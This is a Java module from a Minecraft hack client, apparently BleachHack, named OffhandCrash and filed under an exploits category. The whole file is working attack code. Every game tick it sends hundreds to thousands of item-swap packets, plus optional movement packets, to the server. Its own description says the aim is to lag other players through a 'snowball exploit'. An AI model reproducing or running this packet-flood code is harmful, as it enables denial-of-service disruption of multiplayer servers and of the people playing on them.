package bleach.hack.module.mods;

import bleach.hack.event.events.EventTick;
import com.google.common.eventbus.Subscribe;
import org.lwjgl.glfw.GLFW;

import bleach.hack.gui.clickgui.SettingSlider;
import bleach.hack.gui.clickgui.SettingToggle;
import bleach.hack.module.Category;
import bleach.hack.module.Module;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {
	
	public OffhandCrash() {
		super("OffhandCrash", GLFW.GLFW_KEY_P, Category.EXPLOITS, "Lags people using the snowball exploit",
				new SettingSlider("Switches: ", 0, 2000, 420, 0),
				new SettingToggle("Player Packet", true));
	}

	@Subscribe
	public void onTick(EventTick event) {
		for(int i = 0; i < getSettings().get(0).toSlider().getValue(); i++) {
			mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, Direction.UP));
			if(getSettings().get(1).toToggle().state) mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket(true));
		}
	}
}
